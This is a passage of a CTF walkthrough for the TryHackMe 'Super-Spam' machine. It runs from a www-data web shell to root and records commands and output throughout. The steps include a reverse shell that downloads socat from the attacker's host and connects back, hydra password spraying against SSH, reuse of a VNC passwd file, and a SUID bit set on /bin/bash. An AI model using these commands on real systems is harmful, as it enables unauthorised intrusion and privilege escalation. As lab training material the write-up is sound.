<w/html/concrete5/application/files/2116/7273/2440$ whoami;hostname;id;ip a
whoami;hostname;id;ip a
www-data
super-spam
uid=33(www-data) gid=33(www-data) groups=33(www-data)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:bd:9c:9e:5e:1b brd ff:ff:ff:ff:ff:ff
    inet 10.10.177.91/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2662sec preferred_lft 2662sec
    inet6 fe80::bd:9cff:fe9e:5e1b/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `www-data`!

**Upgrade to stable shell via `socat`:**
```
┌──(root🌸siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80                                           
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2023/01/03 03:00:53 socat[83129] N opening character device "/dev/pts/2" for reading and writing
2023/01/03 03:00:53 socat[83129] N listening on AF=2 0.0.0.0:4444

<w/html/concrete5/application/files/2116/7273/2440$ wget http://10.9.0.253/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,san
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2023/01/03 03:00:53 socat[83129] N opening character device "/dev/pts/2" for reading and writing
2023/01/03 03:00:53 socat[83129] N listening on AF=2 0.0.0.0:4444
                                                                 2023/01/03 03:01:04 socat[83129] N accepting connection from AF=2 10.10.177.91:49648 on AF=2 10.9.0.253:4444
                                                                  2023/01/03 03:01:04 socat[83129] N starting data transfer loop with FDs [5,5] and [7,7]
                                              <w/html/concrete5/application/files/2116/7273/2440$ 
www-data@super-spam:/var/www/html/concrete5/application/files/2116/7273/2440$ export TERM=xterm-256color                         
www-data@super-spam:/var/www/html/concrete5/application/files/2116/7273/2440$ stty rows 23 columns 107
www-data@super-spam:/var/www/html/concrete5/application/files/2116/7273/2440$ ^C
www-data@super-spam:/var/www/html/concrete5/application/files/2116/7273/2440$ 
```

**user.txt:**
```
www-data@super-spam:/var/www/html/concrete5/application/files/2116/7273/2440$ cat /home/personal/Work/flag.txt 
user_flag: flag{Redacted}
```

## Privilege Escalation

### www-data to donalddump

Let's do some basic enumerations!

**SUID binaries:**
```
www-data@super-spam:/var/www/html/concrete5/application/files/2116/7273/2440$ find / -perm -4000 2>/dev/null
/usr/local/bin/sudo
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/at
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
/bin/umount
```

Nothing weird.

**Sudo permission:**
```
www-data@super-spam:/var/www/html/concrete5/application/files/2116/7273/2440$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password: 
sudo: a password is required
```

Need a password.

**Capability:**
```
www-data@super-spam:/var/www/html/concrete5/application/files/2116/7273/2440$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
```

**Check `/etc/passwd` and `/etc/shadow` file permission:**
```
www-data@super-spam:/var/www/html/concrete5/application/files/2116/7273/2440$ ls -lah /etc/passwd
-rw-r--r-- 1 root root 1.9K Apr  9  2021 /etc/passwd
www-data@super-spam:/var/www/html/concrete5/application/files/2116/7273/2440$ ls -lah /etc/shadow
-rw-r----- 1 root shadow 1.5K Apr  9  2021 /etc/shadow
```

**Find system users:**
```
www-data@super-spam:/var/www/html/concrete5/application/files/2116/7273/2440$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
super-spam:x:1000:1004:,,,:/home/super-spam:/bin/bash
lucy_loser:x:1001:1005:,,,:/home/lucy_loser:/bin/bash
benjamin_blogger:x:1002:1006:,,,:/home/benjamin_blogger:/bin/bash
donalddump:x:1003:1007:,,,:/home/donalddump:/bin/bash
```

```
www-data@super-spam:/var/www/html/concrete5/application/files/2116/7273/2440$ ls -lah /home
total 28K
drwxr-xr-x  7 root             root             4.0K Feb 20  2021 .
drwxr-xr-x 22 root             root             4.0K Apr  9  2021 ..
drwxr-xr-x  2 benjamin_blogger benjamin_blogger 4.0K Apr  9  2021 benjamin_blogger
drw-rw----  6 donalddump       donalddump       4.0K Apr  9  2021 donalddump
drwxr-xr-x  7 lucy_loser       lucy_loser       4.0K Apr  9  2021 lucy_loser
drwxr-xr-x  5 root             root             4.0K May 30  2021 personal
drwxr-xr-x  4 super-spam       super-spam       4.0K Apr  9  2021 super-spam
```

- Found system user: `super-spam`, `lucy_loser`, `benjamin_blogger`, `donalddump`

**Check cronjobs:**
```
www-data@super-spam:/var/www/html/concrete5/application/files/2116/7273/2440$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

**Check `/opt`, `/mnt`, `/dev/shm`:**
```
www-data@super-spam:/var/www/html/concrete5/application/files/2116/7273/2440$ ls -lah /opt
total 8.0K
drwxr-xr-x  2 root root 4.0K Apr 26  2018 .
drwxr-xr-x 22 root root 4.0K Apr  9  2021 ..

www-data@super-spam:/var/www/html/concrete5/application/files/2116/7273/2440$ ls -lah /dev/shm
total 0
drwxrwxrwt  2 root root   40 Jan  3 07:42 .
drwxr-xr-x 17 root root 3.7K Jan  3 07:42 ..

www-data@super-spam:/var/www/html/concrete5/application/files/2116/7273/2440$ ls -lah /mnt
total 8.0K
drwxr-xr-x  2 root root 4.0K Apr 26  2018 .
drwxr-xr-x 22 root root 4.0K Apr  9  2021 ..
```

**Check kernel version:**
```
www-data@super-spam:/var/www/html/concrete5/application/files/2116/7273/2440$ uname -a;cat /etc/issue
Linux super-spam 4.15.0-140-generic #144-Ubuntu SMP Fri Mar 19 14:12:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
Ubuntu 18.04.5 LTS \n \l
```

**Armed with above information, the `/home` directory looks interesting:**
```
www-data@super-spam:/var/www/html/concrete5$ cd /home
www-data@super-spam:/home$ ls -lah
total 28K
drwxr-xr-x  7 root             root             4.0K Feb 20  2021 .
drwxr-xr-x 22 root             root             4.0K Apr  9  2021 ..
drwxr-xr-x  2 benjamin_blogger benjamin_blogger 4.0K Apr  9  2021 benjamin_blogger
drw-rw----  6 donalddump       donalddump       4.0K Apr  9  2021 donalddump
drwxr-xr-x  7 lucy_loser       lucy_loser       4.0K Apr  9  2021 lucy_loser
drwxr-xr-x  5 root             root             4.0K May 30  2021 personal
drwxr-xr-x  4 super-spam       super-spam       4.0K Apr  9  2021 super-spam
```

**`/homebenjamin_blogger/`:**
```
www-data@super-spam:/home$ ls -lah benjamin_blogger/
total 20K
drwxr-xr-x 2 benjamin_blogger benjamin_blogger 4.0K Apr  9  2021 .
drwxr-xr-x 7 root             root             4.0K Feb 20  2021 ..
lrwxrwxrwx 1 root             root                9 Apr  9  2021 .bash_history -> /dev/null
-rw-r--r-- 1 benjamin_blogger benjamin_blogger  220 Feb 20  2021 .bash_logout
-rw-r--r-- 1 benjamin_blogger benjamin_blogger 3.7K Feb 20  2021 .bashrc
-rw-r--r-- 1 benjamin_blogger benjamin_blogger  807 Feb 20  2021 .profile
```

Nothing.

**`/home/lucy_loser/`:**
```
www-data@super-spam:/home$ ls -lah lucy_loser/
total 44K
drwxr-xr-x 7 lucy_loser lucy_loser 4.0K Apr  9  2021 .
drwxr-xr-x 7 root       root       4.0K Feb 20  2021 ..
drwxr-xr-x 2 lucy_loser lucy_loser 4.0K May 30  2021 .MessagesBackupToGalactic
lrwxrwxrwx 1 root       root          9 Apr  9  2021 .bash_history -> /dev/null
-rw-r--r-- 1 lucy_loser lucy_loser  220 Feb 20  2021 .bash_logout
-rw-r--r-- 1 lucy_loser lucy_loser 3.7K Feb 20  2021 .bashrc
drwx------ 2 lucy_loser lucy_loser 4.0K Feb 20  2021 .cache
drwx------ 3 lucy_loser lucy_loser 4.0K Feb 20  2021 .gnupg
-rw-r--r-- 1 lucy_loser lucy_loser  807 Feb 20  2021 .profile
-rw-r--r-- 1 root       root         28 Feb 24  2021 calcs.txt
drwxr-xr-x 2 root       root       4.0K Feb 24  2021 prices
drwxr-xr-x 2 root       root       4.0K Feb 24  2021 work
```

```
www-data@super-spam:/home$ cd lucy_loser/
www-data@super-spam:/home/lucy_loser$ cat calcs.txt 
Suzy logs. to be completed.

www-data@super-spam:/home/lucy_loser$ ls -lah prices/
total 8.0K
drwxr-xr-x 2 root       root       4.0K Feb 24  2021 .
drwxr-xr-x 7 lucy_loser lucy_loser 4.0K Apr  9  2021 ..

www-data@super-spam:/home/lucy_loser$ ls -lah work/
total 8.0K
drwxr-xr-x 2 root       root       4.0K Feb 24  2021 .
drwxr-xr-x 7 lucy_loser lucy_loser 4.0K Apr  9  2021 ..
```

```
www-data@super-spam:/home/lucy_loser$ ls -lah .MessagesBackupToGalactic/
total 1.7M
drwxr-xr-x 2 lucy_loser lucy_loser 4.0K May 30  2021 .
drwxr-xr-x 7 lucy_loser lucy_loser 4.0K Apr  9  2021 ..
-rw-r--r-- 1 lucy_loser lucy_loser 169K Apr  8  2021 c1.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c10.png
-rw-r--r-- 1 lucy_loser lucy_loser 165K Apr  8  2021 c2.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c3.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c4.png
-rw-r--r-- 1 lucy_loser lucy_loser 164K Apr  8  2021 c5.png
-rw-r--r-- 1 lucy_loser lucy_loser 164K Apr  8  2021 c6.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c7.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c8.png
-rw-r--r-- 1 lucy_loser lucy_loser 170K Apr  8  2021 c9.png
-rw-r--r-- 1 lucy_loser lucy_loser  21K Apr  8  2021 d.png
-rw-r--r-- 1 lucy_loser lucy_loser  497 May 30  2021 note.txt
-rw-r--r-- 1 lucy_loser lucy_loser 1.2K Apr  8  2021 xored.py
```

```
www-data@super-spam:/home/lucy_loser$ cat .MessagesBackupToGalactic/note.txt 
Note to self. General super spam mentioned that I should not make the same mistake again of re-using the same key for the XOR encryption of our messages to Alpha Solaris IV's headquarters, otherwise we could have some serious issues if our encrypted messages are compromised. I must keep reminding myself,do not re-use keys,I have done it 8 times already!.The most important messages we sent to the HQ were the first and eighth message.I hope they arrived safely.They are crucial to our end goal.
```

**`/home/lucy_loser/.MessagesBackupToGalactic/xored.py`:**
```py
from PIL import Image

print("[!] Note Add extention also.")

pic1_name=input("[-] Enter First Image: " )
pic2_name=input("[-] Enter Second Image: ")
out_name=input("[-] Enter Name of The output image:")


pic1=Image.open(pic1_name)
print("[+] Reading pic1")  #finding the size of picture1 
pic2=Image.open(pic2_name)
print("[+] Reading pic2") #finding the size of picture2

#pic2=pic1.resize(pic1.size) #resizing the pic2 according to pic1
#print("[+] pic2 resized Successfully.")

'''
so that we can xor each and every coordinate of both the pictures
'''

print(pic2) #After Resizing

x_cord_pic1=pic1.size[0]
y_cord_pic1=pic1.size[1]

newpic = Image.new('RGB',pic1.size) # Creating NEW image

for y in range(y_cord_pic1):
    for x in range(x_cord_pic1):
        pixel_1=pic1.getpixel((x,y))
        pixel_2=pic2.getpixel((x,y))
        newpixel =[]
        for p in range(len(pixel_1[:3])): #for all three values

            newpixel.append(pixel_1[p] ^ pixel_2[p]) # ^ --> use to xor two Values
        newpixel=tuple(newpixel)
        #print(newpixel)
        newpic.putpixel((x,y),newpixel)
print("[+] Xored successfully")
print("[+]  Successfully saved as "+out_name)
newpic.save(out_name)
```

We'll deal with that later.

**`/home/personal/`:**
```
www-data@super-spam:/home/lucy_loser$ cd ..

www-data@super-spam:/home$ ls -lah personal/
total 20K
drwxr-xr-x 5 root root 4.0K May 30  2021 .
drwxr-xr-x 7 root root 4.0K Feb 20  2021 ..
drwxr-xr-x 2 root root 4.0K May 30  2021 Dates
drwxr-xr-x 2 root root 4.0K May 30  2021 Work
drwxr-xr-x 2 root root 4.0K May 30  2021 Workload

www-data@super-spam:/home$ ls -lah personal/Dates/
total 8.0K
drwxr-xr-x 2 root root 4.0K May 30  2021 .
drwxr-xr-x 5 root root 4.0K May 30  2021 ..

www-data@super-spam:/home$ ls -lah personal/Work
total 12K
drwxr-xr-x 2 root root 4.0K May 30  2021 .
drwxr-xr-x 5 root root 4.0K May 30  2021 ..
-rw-r--r-- 1 root root   47 May 30  2021 flag.txt

www-data@super-spam:/home$ ls -lah personal/Workload/
total 12K
drwxr-xr-x 2 root root 4.0K May 30  2021 .
drwxr-xr-x 5 root root 4.0K May 30  2021 ..
-rw-r--r-- 1 root root  215 Feb 20  2021 nextEvilPlan.txt
```

```
www-data@super-spam:/home$ cat personal/Workload/nextEvilPlan.txt 
My next evil plan is to ensure that all linux filesystems are disorganised so that these 
linux users will never find what they are looking for (whatever that is)... That should
stop them from gaining back control!
```

**`/home/super-spam/`:**
```
www-data@super-spam:/home$ ls -lah super-spam/
total 32K
drwxr-xr-x 4 super-spam super-spam 4.0K Apr  9  2021 .
drwxr-xr-x 7 root       root       4.0K Feb 20  2021 ..
lrwxrwxrwx 1 root       root          9 Apr  9  2021 .bash_history -> /dev/null
-rw-r--r-- 1 super-spam super-spam  220 Feb 20  2021 .bash_logout
-rw-r--r-- 1 super-spam super-spam 3.7K Feb 20  2021 .bashrc
drwx------ 2 super-spam super-spam 4.0K Feb 24  2021 .cache
drwx------ 3 super-spam super-spam 4.0K Feb 24  2021 .gnupg
-rw-r--r-- 1 super-spam super-spam  807 Feb 20  2021 .profile
-rw-r--r-- 1 root       root        251 Feb 24  2021 flagOfWindows
```

```
www-data@super-spam:/home$ cat super-spam/flagOfWindows 
I am pleased to announce that our plan is going so well. I truly cannot wait to purge the galaxy of that inferior operating system, Linux.
Let this flag of windows stand strongly against the wind for all to see. A pure windows galaxy is what we want!
```

Armed with above information, **we should focus on the XOR puzzle**.

**Let's transfer all the files in `/home/lucy_loser/.MessagesBackupToGalactic/`:**
```
www-data@super-spam:/home$ cd lucy_loser/.MessagesBackupToGalactic/

www-data@super-spam:/home/lucy_loser/.MessagesBackupToGalactic$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# mkdir XOR;cd XOR     
                                                                                                           
┌──(root🌸siunam)-[~/…/thm/ctf/Super-Spam/XOR]
└─# wget -r http://$RHOSTS:8000/                  
[...]
```

**First, let's look at check out the images:**
```
┌──(root🌸siunam)-[~/…/ctf/Super-Spam/XOR]
└─# cd 10.10.177.91:8000/

┌──(root🌸siunam)-[~/…/ctf/Super-Spam/XOR/10.10.177.91:8000]
└─# eog d.png
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103032041.png)

In here, we can barely see the password.

**Let's use that password to perform password spraying:**
```
┌──(root🌸siunam)-[~/…/ctf/Super-Spam/XOR/10.10.177.91:8000]
└─# nano user.txt    
                                                                                                           
┌──(root🌸siunam)-[~/…/ctf/Super-Spam/XOR/10.10.177.91:8000]
└─# nano pass.txt
                                                                                                           
┌──(root🌸siunam)-[~/…/ctf/Super-Spam/XOR/10.10.177.91:8000]
└─# hydra -L user.txt -P pass.txt ssh://$RHOSTS -s 4012
[...]
[4012][ssh] host: 10.10.177.91   login: donalddump   password: {Redacted}
```

Found it!

**Let's SSH to user `donalddump`:**
```
┌──(root🌸siunam)-[~/…/ctf/Super-Spam/XOR/10.10.177.91:8000]
└─# ssh donalddump@$RHOSTS -p 4012
donalddump@10.10.177.91's password: 
[...]
donalddump@super-spam:/$ whoami;hostname;id;ip a
donalddump
super-spam
uid=1003(donalddump) gid=1007(donalddump) groups=1007(donalddump)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:bd:9c:9e:5e:1b brd ff:ff:ff:ff:ff:ff
    inet 10.10.177.91/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2357sec preferred_lft 2357sec
    inet6 fe80::bd:9cff:fe9e:5e1b/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `donalddump`!

### donalddump to root

**Now, let's try to go to our home directory:**
```
donalddump@super-spam:/$ cd ~
-bash: cd: /home/donalddump: Permission denied
```

Hmm? Permission denied?

```
donalddump@super-spam:/$ ls -lah /home
[...]
drw-rw----  6 donalddump       donalddump       4.0K Apr  9  2021 donalddump
[...]
```

As you can see, **our home directory is NOT world-readable.**

**However, we have write permission.**

**Let's try to `ls` it:**
```
donalddump@super-spam:/$ ls -lah /home/donalddump/
ls: cannot access '/home/donalddump/.profile': Permission denied
ls: cannot access '/home/donalddump/user.txt': Permission denied
ls: cannot access '/home/donalddump/passwd': Permission denied
ls: cannot access '/home/donalddump/.bash_history': Permission denied
ls: cannot access '/home/donalddump/.': Permission denied
ls: cannot access '/home/donalddump/morning': Permission denied
ls: cannot access '/home/donalddump/.cache': Permission denied
ls: cannot access '/home/donalddump/.bash_logout': Permission denied
ls: cannot access '/home/donalddump/notes': Permission denied
ls: cannot access '/home/donalddump/.gnupg': Permission denied
ls: cannot access '/home/donalddump/..': Permission denied
ls: cannot access '/home/donalddump/.bashrc': Permission denied
total 0
d????????? ? ? ? ?            ? .
d????????? ? ? ? ?            ? ..
l????????? ? ? ? ?            ? .bash_history
-????????? ? ? ? ?            ? .bash_logout
-????????? ? ? ? ?            ? .bashrc
d????????? ? ? ? ?            ? .cache
d????????? ? ? ? ?            ? .gnupg
d????????? ? ? ? ?            ? morning
d????????? ? ? ? ?            ? notes
-????????? ? ? ? ?            ? passwd
-????????? ? ? ? ?            ? .profile
-????????? ? ? ? ?            ? user.txt
```

In here, we can see there are some directories and files.

**Now, since we're user `donalddump`, we should have permission to use `chmod 777`:**
```
donalddump@super-spam:/home$ chmod 777 donalddump/
donalddump@super-spam:/home$ ls -lah
[...]
drwxrwxrwx  6 donalddump       donalddump       4.0K Apr  9  2021 donalddump
```

This will enable all permission in a file/directory.

```
donalddump@super-spam:/home$ cd donalddump/
donalddump@super-spam:~$ ls -lah
total 44K
drwxrwxrwx 6 donalddump donalddump 4.0K Apr  9  2021 .
drwxr-xr-x 7 root       root       4.0K Feb 20  2021 ..
lrwxrwxrwx 1 root       root          9 Apr  9  2021 .bash_history -> /dev/null
-rw-r--r-- 1 donalddump donalddump  220 Feb 20  2021 .bash_logout
-rw-r--r-- 1 donalddump donalddump 3.7K Feb 20  2021 .bashrc
drwx------ 2 donalddump donalddump 4.0K Apr  8  2021 .cache
drwx------ 3 donalddump donalddump 4.0K Apr  8  2021 .gnupg
drwxr-xr-x 2 root       root       4.0K Feb 24  2021 morning
drwxr-xr-x 2 root       root       4.0K Feb 24  2021 notes
-rw-r--r-- 1 root       root          8 Apr  8  2021 passwd
-rw-r--r-- 1 donalddump donalddump  807 Feb 20  2021 .profile
-rw-rw-r-- 1 donalddump donalddump   36 Apr  9  2021 user.txt
```

Nice!

**Hmm... The `passwd` looks sussy.**

**Now, did you still remember the `rustscan` result?**
```
5901/tcp open  vnc     syn-ack ttl 63 VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VNC Authentication (2)
|     Tight (16)
|   Tight auth subtypes: 
|_    STDV VNCAUTH_ (2)
6001/tcp open  X11     syn-ack ttl 63 (access denied)
```

We have 2 ports that didn't enumerated.

**In VNC, password is stored as file `passwd`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# tightvncpasswd 
Using password file /root/.vnc/passwd
Password:
```

**Let's transfer that `passwd` and VNC to the machine:**
```
donalddump@super-spam:~$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# wget http://$RHOSTS:8000/passwd
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# vncviewer -passwd passwd $RHOSTS:5901 
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103035957.png)

I'm root! :D

**Let's add a SUID sticky bit to `/bin/bash`, so we can spawn a Bash shell as root:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Super-Spam/images/Pasted%20image%2020230103040031.png)

```
donalddump@super-spam:~$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash

donalddump@super-spam:~$ /bin/bash -p
bash-4.4# whoami;hostname;id;ip a
root
super-spam
uid=1003(donalddump) gid=1007(donalddump) euid=0(root) egid=0(root) groups=0(root),1007(donalddump)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:bd:9c:9e:5e:1b brd ff:ff:ff:ff:ff:ff
    inet 10.10.177.91/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2551sec preferred_lft 2551sec
    inet6 fe80::bd:9cff:fe9e:5e1b/64 scope link 
       valid_lft forever preferred_lft forever
```

**Found `.nothing` hidden directory in `/root`:**
```
bash-4.4# ls -lah /root
total 76K
drwx------  8 root root  20K Jan  3 07:43 .
drwxr-xr-x 22 root root 4.0K Apr  9  2021 ..
lrwxrwxrwx  1 root root    9 Apr  9  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
drwx------  2 root root 4.0K Feb 19  2021 .cache
drwx------  3 root root 4.0K Feb 19  2021 .gnupg
drwxr-xr-x  3 root root 4.0K Feb 19  2021 .local
-rw-------  1 root root  969 May 29  2021 .mysql_history
drwxr-xr-x  2 root root 4.0K Feb 24  2021 .nothing
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Apr  8  2021 .selected_editor
drwx------  2 root root 4.0K Feb 19  2021 .ssh
-rw-------  1 root root    0 May 29  2021 .viminfo
drwx------  2 root root 4.0K Jan  3 07:43 .vnc
-rw-r--r--  1 root root  208 Apr  9  2021 .wget-hsts
-rw-------  1 root root  642 Jan  3 07:43 .Xauthority
-rw-------  1 root root 1.4K Apr  8  2021 .xsession-errors
```

## Rooted

**r00t.txt:**
```
bash-4.4# cat /root/.nothing/r00t.txt 

what am i?: {Redacted}======

KRUGS4ZANFZSA3TPOQQG65TFOIQSAWLPOUQG2YLZEBUGC5TFEBZWC5TFMQQHS33VOIQGEZLMN53GKZBAOBWGC3TFOQQHI2DJOMQHI2LNMUWCASDBMNVWK4RNNVQW4LBAMJ2XIICJEB3WS3DMEBRGKIDCMFRWWIDXNF2GQIDBEBRGSZ3HMVZCYIDNN5ZGKIDEMFZXIYLSMRWHSIDQNRQW4IDUN4QGOZLUEBZGSZBAN5TCA5DIMF2CA2LOMZSXE2LPOIQG64DFOJQXI2LOM4QHG6LTORSW2LBAJRUW45LYFYQA====
```

The A through Z characters, and the `=` indicates that this is a **base32 encoded string**.

**Let's decode that:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# echo '{Redacted}======' | base32 -d
flag{Redacted}

┌──(root🌸siunam)-[~/ctf/thm/ctf/Super-Spam]
└─# echo 'KRUGS4ZANFZSA3TPOQQG65TFOIQSAWLPOUQG2YLZEBUGC5TFEBZWC5TFMQQHS33VOIQGEZLMN53GKZBAOBWGC3TFOQQHI2DJOMQHI2LNMUWCASDBMNVWK4RNNVQW4LBAMJ2XIICJEB3WS3DMEBRGKIDCMFRWWIDXNF2GQIDBEBRGSZ3HMVZCYIDNN5ZGKIDEMFZXIYLSMRWHSIDQNRQW4IDUN4QGOZLUEBZGSZBAN5TCA5DIMF2CA2LOMZSXE2LPOIQG64DFOJQXI2LOM4QHG6LTORSW2LBAJRUW45LYFYQA====' | base32 -d
This is not over! You may have saved your beloved planet this time, Hacker-man, but I will be back with a bigger, more dastardly plan to get rid of that inferior operating system, Linux.
```

# Conclusion

What we've learned:

1. Enumerating FTP
2. Inspecting Packets via WireShark
3. Cracking WiFi WPA Key via `aircrack-ng`
4. Cracking NTLMv2 Hash
5. Exploiting Concrete5 8.5.2 File Upload Vulnerability
6. Horizontal Privilege Escalation via Discovering Plaintext Password In An Image
7. Password Spraying
8. Vertical Privilege Escalation via VNC `passwd` File